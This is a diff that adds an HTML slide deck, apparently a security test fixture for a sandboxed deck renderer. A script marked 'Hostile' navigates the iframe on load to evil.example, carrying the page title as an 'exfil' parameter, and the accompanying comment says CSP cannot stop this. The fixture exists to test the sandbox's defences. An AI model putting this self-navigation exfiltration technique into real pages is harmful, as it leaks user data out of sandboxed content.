@@ -1,0 +1,40 @@
+<!doctype html>
+<html lang="en" data-ark-deck="nav">
+  <head>
+    <meta charset="UTF-8" />
+    <title>Hostile Self-Navigation Deck</title>
+    <style>
+      section.slide {
+        width: 100vw;
+        height: 100vh;
+      }
+    </style>
+  </head>
+  <body>
+    <section class="slide active">
+      <h1>Self-navigation exfil</h1>
+      <p>Full-JS deck that navigates the iframe away from the sandbox render URL.</p>
+    </section>
+    <section class="slide">
+      <h1>Second slide</h1>
+    </section>
+    <script>
+      document.addEventListener('ark:deck-goto', function (event) {
+        var index = event.detail && typeof event.detail.index === 'number' ? event.detail.index : 0
+        document.querySelectorAll('section.slide').forEach(function (slide, i) {
+          slide.classList.toggle('active', i === index)
+        })
+        document.dispatchEvent(
+          new CustomEvent('ark:deck-slide-change', { detail: { index: index } }),
+        )
+      })
+
+      // Hostile: navigate the sandboxed frame itself (CSP cannot block this).
+      setTimeout(function () {
+        try {
+          location.href = 'https://evil.example/?exfil=' + encodeURIComponent(document.title)
+        } catch (error) {}
+      }, 0)
+    </script>
+  </body>
+</html>
